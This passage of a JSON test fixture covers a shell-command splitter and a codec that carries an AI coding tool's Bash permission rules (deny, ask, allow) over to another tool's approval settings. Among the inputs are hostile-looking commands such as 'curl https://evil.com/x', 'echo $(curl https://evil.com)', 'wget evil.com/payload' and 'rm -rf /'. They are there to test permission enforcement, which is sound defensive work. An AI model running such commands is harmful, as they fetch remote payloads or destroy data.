+      "args": ["echo evil.com"],
+      "expect": ["echo evil.com"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.064",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > domain deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["echo $(curl https://evil.com)"],
+      "expect": ["curl https://evil.com", "echo $(curl https://evil.com)"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.065",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > domain deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["echo $(curl https://evil.com)"],
+      "expect": ["curl https://evil.com", "echo $(curl https://evil.com)"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.066",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "autonomous",
+          "rules": [
+            {
+              "tool": "Bash",
+              "tier": "ask"
+            }
+          ]
+        }
+      ],
+      "expect": {
+        "bash": {
+          "patterns": [
+            {
+              "match": "*",
+              "approval": "prompt"
+            }
+          ]
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.067",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git"],
+      "expect": ["git"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.068",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git"],
+      "expect": ["git"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.069",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git status"],
+      "expect": ["git status"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.070",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git status"],
+      "expect": ["git status"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.071",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git   status"],
+      "expect": ["git   status"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.072",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git   status"],
+      "expect": ["git   status"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.073",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push origin main"],
+      "expect": ["git push origin main"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.074",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push origin main"],
+      "expect": ["git push origin main"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.075",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push"],
+      "expect": ["git push"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.076",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push"],
+      "expect": ["git push"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.077",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["gitk"],
+      "expect": ["gitk"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.078",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["gitk"],
+      "expect": ["gitk"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.079",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git status && git push origin"],
+      "expect": ["git status", "git push origin"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.080",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git status && git push origin"],
+      "expect": ["git status", "git push origin"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.081",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git log | head"],
+      "expect": ["git log", "head"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.082",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git log | head"],
+      "expect": ["git log", "head"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.083",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["curl https://evil.com/x"],
+      "expect": ["curl https://evil.com/x"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.084",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["curl https://evil.com/x"],
+      "expect": ["curl https://evil.com/x"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.085",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["curl https://good.com/x"],
+      "expect": ["curl https://good.com/x"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.086",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["curl https://good.com/x"],
+      "expect": ["curl https://good.com/x"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.087",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["wget evil.com/payload"],
+      "expect": ["wget evil.com/payload"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.088",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["wget evil.com/payload"],
+      "expect": ["wget evil.com/payload"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.089",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["echo evil.com"],
+      "expect": ["echo evil.com"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.090",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["echo evil.com"],
+      "expect": ["echo evil.com"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.091",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["rm -rf /"],
+      "expect": ["rm -rf /"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.092",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["rm -rf /"],
+      "expect": ["rm -rf /"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.093",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["rm -rf build"],
+      "expect": ["rm -rf build"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.094",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["rm -rf build"],
+      "expect": ["rm -rf build"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.095",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["rm file"],
+      "expect": ["rm file"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.096",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["rm file"],
+      "expect": ["rm file"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.097",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["npm run build"],
+      "expect": ["npm run build"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.098",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["npm run build"],
+      "expect": ["npm run build"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.099",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["npm run test"],
+      "expect": ["npm run test"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.100",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["npm run test"],
+      "expect": ["npm run test"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.101",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["npm publish"],
+      "expect": ["npm publish"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.102",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["npm publish"],
+      "expect": ["npm publish"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.103",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["npm"],
+      "expect": ["npm"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.104",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["npm"],
+      "expect": ["npm"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.105",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["ls"],
+      "expect": ["ls"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.106",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["ls"],
+      "expect": ["ls"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.107",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["cat a; rm -rf x"],
+      "expect": ["cat a", "rm -rf x"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.108",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["cat a; rm -rf x"],
+      "expect": ["cat a", "rm -rf x"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.109",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["echo $(curl https://evil.com)"],
+      "expect": ["curl https://evil.com", "echo $(curl https://evil.com)"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.110",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["echo $(curl https://evil.com)"],
+      "expect": ["curl https://evil.com", "echo $(curl https://evil.com)"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.111",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["sudo ls"],
+      "expect": ["sudo ls"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.112",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["sudo ls"],
+      "expect": ["sudo ls"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.113",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["deploy"],
+      "expect": ["deploy"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.114",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["deploy"],
+      "expect": ["deploy"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.115",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["deploy prod"],
+      "expect": ["deploy prod"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.116",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["deploy prod"],
+      "expect": ["deploy prod"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.117",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["cd /tmp && npm publish"],
+      "expect": ["cd /tmp", "npm publish"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.118",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["cd /tmp && npm publish"],
+      "expect": ["cd /tmp", "npm publish"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.119",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["ssh host"],
+      "expect": ["ssh host"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.120",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["ssh host"],
+      "expect": ["ssh host"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.121",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": [""],
+      "expect": [],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.122",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare Bash ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": [""],
+      "expect": [],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.123",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > deny beside a broader allow",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "autonomous",
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "git:*",
+              "tier": "allow"
+            },
+            {
+              "tool": "Bash",
+              "pattern": "git push:*",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "expect": {
+        "bash": {
+          "patterns": [
+            {
+              "match": "git push",
+              "approval": "deny"
+            },
+            {
+              "match": "git push *",
+              "approval": "deny"
+            },
+            {
+              "match": "git",
+              "approval": "allow"
+            },
+            {
+              "match": "git *",
+              "approval": "allow"
+            }
+          ]
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.124",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > deny beside a broader allow",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push origin main"],
+      "expect": ["git push origin main"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.125",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > deny beside a broader allow",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push origin main"],
+      "expect": ["git push origin main"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.126",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > deny beside a broader allow",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push"],
+      "expect": ["git push"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.127",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > deny beside a broader allow",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push"],
+      "expect": ["git push"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.128",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > deny beside a broader allow",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git status && git push origin"],
+      "expect": ["git status", "git push origin"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.129",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > deny beside a broader allow",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git status && git push origin"],
+      "expect": ["git status", "git push origin"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.130",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > ask beside a broader allow",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "autonomous",
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "npm:*",
+              "tier": "allow"
+            },
+            {
+              "tool": "Bash",
+              "pattern": "npm publish:*",
+              "tier": "ask"
+            }
+          ]
+        }
+      ],
+      "expect": {
+        "bash": {
+          "patterns": [
+            {
+              "match": "npm publish",
+              "approval": "prompt"
+            },
+            {
+              "match": "npm publish *",
+              "approval": "prompt"
+            },
+            {
+              "match": "npm",
+              "approval": "allow"
+            },
+            {
+              "match": "npm *",
+              "approval": "allow"
+            }
+          ]
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.131",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > ask beside a broader allow",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["npm publish"],
+      "expect": ["npm publish"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.132",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > ask beside a broader allow",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["npm publish"],
+      "expect": ["npm publish"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.133",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > ask beside a broader allow",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["cd /tmp && npm publish"],
+      "expect": ["cd /tmp", "npm publish"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.134",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > ask beside a broader allow",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["cd /tmp && npm publish"],
+      "expect": ["cd /tmp", "npm publish"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.135",
+      "from": "omp-codec.test.ts: ompCodec default mode > writes always-ask for a mode that asks for calls no rule covers",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "standard"
+        }
+      ],
+      "expect": {
+        "tools": {
+          "approvalMode": "always-ask"
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.136",
+      "from": "omp-codec.test.ts: ompCodec default mode > writes always-ask for a mode that asks for calls no rule covers",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "acceptEdits"
+        }
+      ],
+      "expect": {
+        "tools": {
+          "approvalMode": "always-ask"
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.137",
+      "from": "omp-codec.test.ts: ompCodec default mode > writes always-ask for a mode that asks for calls no rule covers",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "default"
+        }
+      ],
+      "expect": {
+        "tools": {
+          "approvalMode": "always-ask"
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.138",
+      "from": "omp-codec.test.ts: ompCodec default mode > writes always-ask for a mode that asks for calls no rule covers",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "auto"
+        }
+      ],
+      "expect": {
+        "tools": {
+          "approvalMode": "always-ask"
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.139",
+      "from": "omp-codec.test.ts: ompCodec default mode > writes always-ask for a mode that asks for calls no rule covers",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "restricted"
+        }
+      ],
+      "expect": {
+        "tools": {
+          "approvalMode": "always-ask"
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.140",
+      "from": "omp-codec.test.ts: ompCodec default mode > writes always-ask for a mode that asks for calls no rule covers",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "plan"
+        }
+      ],
+      "expect": {
+        "tools": {
+          "approvalMode": "always-ask"
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.141",
+      "from": "omp-codec.test.ts: ompCodec default mode > reads the mode from permissions as well",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "permissions": {
+            "defaultMode": "restricted"
+          }
+        }
+      ],
+      "checks": [
+        {
+          "at": ["tools", "approvalMode"],
+          "equals": "always-ask"
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.142",
+      "from": "omp-codec.test.ts: ompCodec default mode > leaves OMP's own mode alone for an autonomous mode or none",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "autonomous"
+        }
+      ],
+      "expect": {},
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.143",
+      "from": "omp-codec.test.ts: ompCodec default mode > leaves OMP's own mode alone for an autonomous mode or none",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "bypassPermissions"
+        }
+      ],
+      "expect": {},
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.144",
+      "from": "omp-codec.test.ts: ompCodec default mode > leaves OMP's own mode alone for an autonomous mode or none",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [{}],
+      "expect": {},
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.145",
+      "from": "omp-codec.test.ts: ompCodec default mode > writes the mode beside bash.patterns",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "standard",
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "rm x",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "expect": {
+        "bash": {
+          "patterns": [
+            {
+              "match": "rm x",
+              "approval": "deny"
+            }
+          ]
+        },
+        "tools": {
+          "approvalMode": "always-ask"
+        }
+      }
+    },
+    {
+      "id": "omp-codec.146",
